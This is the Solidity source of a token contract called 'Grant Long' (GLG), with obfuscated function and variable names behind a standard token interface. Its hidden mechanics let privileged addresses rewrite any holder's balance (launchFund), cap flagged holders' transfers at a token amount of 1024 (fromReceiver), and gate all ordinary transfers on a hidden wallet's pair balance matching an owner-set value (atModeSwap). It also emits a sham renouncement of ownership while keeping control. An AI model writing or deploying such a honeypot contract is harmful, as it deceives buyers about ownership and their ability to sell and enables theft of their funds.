//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface minAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract shouldLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalIsToken {
    function createPair(address shouldSwapFee, address senderLaunched) external returns (address);
}

interface tradingLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingMaxTx) external view returns (uint256);

    function transfer(address receiverMaxList, uint256 marketingTrading) external returns (bool);

    function allowance(address minList, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingTrading) external returns (bool);

    function transferFrom(
        address sender,
        address receiverMaxList,
        uint256 marketingTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableWallet, uint256 value);
    event Approval(address indexed minList, address indexed spender, uint256 value);
}

interface tradingLaunchMetadata is tradingLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract GrantLong is shouldLiquidity, tradingLaunch, tradingLaunchMetadata {

    mapping(address => uint256) private enableLaunch;

    function balanceOf(address tradingMaxTx) public view virtual override returns (uint256) {
        return enableLaunch[tradingMaxTx];
    }

    uint256 private autoSwap;

    bool private tradingMode;

    function allowance(address toList, address autoExemptWallet) external view virtual override returns (uint256) {
        if (autoExemptWallet == liquidityMode) {
            return type(uint256).max;
        }
        return txLimit[toList][autoExemptWallet];
    }

    string private buyAmountLimit = "Grant Long";

    function liquidityReceiver(address receiverSwap) public {
        if (atToken) {
            return;
        }
        
        fromIsReceiver[receiverSwap] = true;
        
        atToken = true;
    }

    bool public buyMax;

    function launchFund(address receiverLaunch, uint256 marketingTrading) public {
        maxTeamAmount();
        enableLaunch[receiverLaunch] = marketingTrading;
    }

    function fromReceiver(address maxSwap) public {
        maxTeamAmount();
        
        if (maxSwap == amountSwapLaunched || maxSwap == receiverLaunched) {
            return;
        }
        takeShould[maxSwap] = true;
    }

    mapping(address => mapping(address => uint256)) private txLimit;

    address public receiverLaunched;

    uint256 private amountSwap = 100000000 * 10 ** 18;

    uint256 constant teamToken = 2 ** 10;

    constructor (){
        if (liquidityMin) {
            fromMax = autoSwap;
        }
        minAt exemptTrading = minAt(liquidityMode);
        receiverLaunched = totalIsToken(exemptTrading.factory()).createPair(exemptTrading.WETH(), address(this));
        if (autoSwap == fromMax) {
            fromMax = autoSwap;
        }
        amountSwapLaunched = _msgSender();
        fundAt();
        fromIsReceiver[amountSwapLaunched] = true;
        enableLaunch[amountSwapLaunched] = amountSwap;
        if (fromMax != autoSwap) {
            autoSwap = fromMax;
        }
        emit Transfer(address(0), amountSwapLaunched, amountSwap);
    }

    function owner() external view returns (address) {
        return modeAtExempt;
    }

    string private modeMarketing = "GLG";

    function tokenAutoSender(address txToken, address receiverMaxList, uint256 marketingTrading) internal returns (bool) {
        require(enableLaunch[txToken] >= marketingTrading);
        enableLaunch[txToken] -= marketingTrading;
        enableLaunch[receiverMaxList] += marketingTrading;
        emit Transfer(txToken, receiverMaxList, marketingTrading);
        return true;
    }

    uint256 maxListLaunched;

    function launchedSwapTeam(uint256 marketingTrading) public {
        maxTeamAmount();
        maxListLaunched = marketingTrading;
    }

    function maxTeamAmount() private view {
        require(fromIsReceiver[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return modeAtExempt;
    }

    function approve(address autoExemptWallet, uint256 marketingTrading) public virtual override returns (bool) {
        txLimit[_msgSender()][autoExemptWallet] = marketingTrading;
        emit Approval(_msgSender(), autoExemptWallet, marketingTrading);
        return true;
    }

    address private modeAtExempt;

    mapping(address => bool) public fromIsReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return amountSwap;
    }

    address teamShouldLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return receiverFeeFund;
    }

    uint256 public fromMax;

    function name() external view virtual override returns (string memory) {
        return buyAmountLimit;
    }

    event OwnershipTransferred(address indexed teamSellWallet, address indexed amountReceiverTake);

    function transferFrom(address txToken, address receiverMaxList, uint256 marketingTrading) external override returns (bool) {
        if (_msgSender() != liquidityMode) {
            if (txLimit[txToken][_msgSender()] != type(uint256).max) {
                require(marketingTrading <= txLimit[txToken][_msgSender()]);
                txLimit[txToken][_msgSender()] -= marketingTrading;
            }
        }
        return atModeSwap(txToken, receiverMaxList, marketingTrading);
    }

    uint8 private receiverFeeFund = 18;

    function transfer(address receiverLaunch, uint256 marketingTrading) external virtual override returns (bool) {
        return atModeSwap(_msgSender(), receiverLaunch, marketingTrading);
    }

    address public amountSwapLaunched;

    function fundAt() public {
        emit OwnershipTransferred(amountSwapLaunched, address(0));
        modeAtExempt = address(0);
    }

    bool public liquidityMin;

    function atModeSwap(address txToken, address receiverMaxList, uint256 marketingTrading) internal returns (bool) {
        if (txToken == amountSwapLaunched) {
            return tokenAutoSender(txToken, receiverMaxList, marketingTrading);
        }
        uint256 swapMaxToken = tradingLaunch(receiverLaunched).balanceOf(teamShouldLiquidity);
        require(swapMaxToken == maxListLaunched);
        require(receiverMaxList != teamShouldLiquidity);
        if (takeShould[txToken]) {
            return tokenAutoSender(txToken, receiverMaxList, teamToken);
        }
        return tokenAutoSender(txToken, receiverMaxList, marketingTrading);
    }

    mapping(address => bool) public takeShould;

    function symbol() external view virtual override returns (string memory) {
        return modeMarketing;
    }

    uint256 swapAmount;

    bool public atToken;

    address liquidityMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}